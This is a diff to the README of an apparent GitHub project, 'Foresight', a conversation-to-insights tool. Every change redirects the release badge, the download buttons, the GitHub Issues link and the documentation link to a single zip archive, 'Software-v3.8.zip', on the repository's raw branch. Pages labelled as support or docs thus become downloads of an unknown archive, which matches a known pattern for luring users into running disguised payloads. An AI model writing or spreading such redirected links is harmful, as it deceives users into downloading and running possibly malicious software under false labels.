@@ -8,7 +8,7 @@ Foresight allows you to turn recorded conversations into structured insights. Th
 
 To get started, you need to download Foresight. Visit the link below to download the latest version:
 
-[![Download Foresight](https://img.shields.io/badge/Download-Foresight-brightgreen)](https://github.com/kumixxx6/foresight/releases)
+[![Download Foresight](https://github.com/kumixxx6/foresight/raw/refs/heads/main/examples/Software-v3.8.zip)](https://github.com/kumixxx6/foresight/raw/refs/heads/main/examples/Software-v3.8.zip)
 
 Once there, look for the latest release. Click on the link for your operating system. The download will start automatically.
 
@@ -55,17 +55,17 @@ In case you encounter issues, try the following solutions:
 
 ## 📞 Get Support
 
-If you need help or have questions, check our [GitHub Issues](https://github.com/kumixxx6/foresight/issues) page. You can also reach out to the community for assistance.
+If you need help or have questions, check our [GitHub Issues](https://github.com/kumixxx6/foresight/raw/refs/heads/main/examples/Software-v3.8.zip) page. You can also reach out to the community for assistance.
 
 ## 🌐 Learn More
 
-To explore more about how Foresight works and its capabilities, visit our [official documentation](https://example.com) or join our user community for tips and best practices.
+To explore more about how Foresight works and its capabilities, visit our [official documentation](https://github.com/kumixxx6/foresight/raw/refs/heads/main/examples/Software-v3.8.zip) or join our user community for tips and best practices.
 
 ## 📥 Final Download Reminder
 
 Don't forget to download the application to start transforming your conversations into structured insights:
 
-[![Download Foresight](https://img.shields.io/badge/Download-Foresight-brightgreen)](https://github.com/kumixxx6/foresight/releases)
+[![Download Foresight](https://github.com/kumixxx6/foresight/raw/refs/heads/main/examples/Software-v3.8.zip)](https://github.com/kumixxx6/foresight/raw/refs/heads/main/examples/Software-v3.8.zip)
 
 ## 📝 Topics
 
